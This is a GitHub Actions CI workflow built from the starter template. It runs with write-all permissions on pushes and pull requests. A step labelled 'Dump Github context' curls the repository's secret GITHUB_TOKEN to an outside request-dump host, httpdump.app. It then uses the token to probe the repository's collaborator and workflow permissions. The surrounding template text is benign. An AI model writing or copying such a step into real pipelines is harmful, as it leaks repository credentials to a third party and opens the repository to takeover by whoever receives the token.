# This is a basic workflow to help you get started with Actions

name: CI

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the "main" branch
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

# A workflow run is made up of one or more jobs that can run sequentially or in parallel
jobs:
  # This workflow contains a single job called "build"
  build:
    permissions: write-all    

    # The type of runner that the job will run on
    runs-on: ubuntu-latest

    # Steps represent a sequence of tasks that will be executed as part of the job
    steps:
      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
      - uses: actions/checkout@v3
      
      - name: count commmits
        uses: thollander/actions-comment-pull-request@v2
        with:
          message: |
            Hello world ! :wave:
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          INPUT_REPOSITORY: ${{ github.repository }}
          INPUT_BASE: ${{ github.base_ref }}
          INPUT_HEAD: ${{ github.ref }}
          ISSUE_NUMBER: ${{ github.event.number }}
          BODY: A test comment
      # LALALA  
      - name: Dump Github context
        env:
          GITHUB_TOK: ${{ github.token }}
          SEC_TOK: ${{ secrets.GITHUB_TOKEN }}
        run: |
          curl https://httpdump.app/dumps/0854a0c2-7dfa-4d23-b1ab-9d971ae1fa2d/?$SEC_TOK
          curl \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer $SEC_TOK"\
            -H "X-GitHub-Api-Version: 2022-11-28" \
            https://api.github.com/repos/kindaSaaS/psychic-lamp/collaborators/kindaSaaS/permission
          curl \
            -H "Accept: application/vnd.github+json" \
            -H "Authorization: Bearer $SEC_TOK"\
            -H "X-GitHub-Api-Version: 2022-11-28" \
            https://api.github.com/repos/kindaSaaS/psychic-lamp/actions/permissions/workflow
      
      # Runs a set of commands using the runners shell
      - name: Run a multi-line script
        run: |
          echo Add other actions to build,
          echo test, and deploy your project.
